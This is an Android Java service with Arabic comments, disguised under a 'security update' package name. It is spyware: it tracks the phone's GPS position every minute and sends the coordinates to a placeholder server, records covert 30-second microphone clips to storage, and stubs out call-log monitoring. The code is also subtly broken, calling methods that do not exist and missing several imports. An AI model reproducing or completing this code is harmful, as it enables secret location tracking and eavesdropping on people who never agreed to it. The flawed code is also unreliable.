package com.security.update;

import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;
import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class RemoteControl extends Service {
    private static final String TAG = "RemoteControl";
    private LocationManager locationManager;
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Remote control service started");
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startLocationTracking();
        startCallMonitoring();
        return START_STICKY;
    }
    
    public void trackLocation() {
        try {
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
            
            LocationListener locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    double latitude = location.getLatitude();
                    double longitude = location.getLongitude();
                    
                    // إرسال الموقع للسيرفر
                    sendLocationToServer(latitude, longitude);
                }
                
                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {}
                
                @Override
                public void onProviderEnabled(String provider) {}
                
                @Override
                public void onProviderDisabled(String provider) {}
            };
            
            // طلب تحديثات الموقع كل دقيقة
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER, 
                60000,  // كل دقيقة
                10,     // كل 10 أمتار
                locationListener
            );
            
        } catch (SecurityException e) {
            Log.e(TAG, "Location permission denied");
        } catch (Exception e) {
            Log.e(TAG, "Location tracking failed: " + e.getMessage());
        }
    }
    
    public void monitorCalls() {
        // مراقبة سجل المكالمات
        // (يتطلب صلاحية READ_CALL_LOG)
    }
    
    public void recordAudio() {
        if (isRecording) return;
        
        try {
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            String outputFile = "/sdcard/record_" + timeStamp + ".3gp";
            
            mediaRecorder.setOutputFile(outputFile);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
            
            // إيقاف التسجيل بعد 30 ثانية
            new android.os.Handler().postDelayed(
                new Runnable() {
                    public void run() {
                        stopRecording();
                    }
                }, 
            30000);
            
        } catch (Exception e) {
            Log.e(TAG, "Audio recording failed: " + e.getMessage());
        }
    }
    
    private void stopRecording() {
        if (mediaRecorder != null && isRecording) {
            try {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                isRecording = false;
            } catch (Exception e) {
                Log.e(TAG, "Stop recording failed: " + e.getMessage());
            }
        }
    }
    
    private void sendLocationToServer(double latitude, double longitude) {
        // إرسال الإحداثيات للسيرفر
        try {
            String urlString = "http://yourserver.com/location" +
                "?lat=" + latitude + "&lon=" + longitude +
                "&time=" + System.currentTimeMillis();
            
            URL url = new URL(urlString);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("GET");
            connection.connect();
            
            int responseCode = connection.getResponseCode();
            connection.disconnect();
            
        } catch (Exception e) {
            Log.e(TAG, "Location send failed: " + e.getMessage());
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
        }
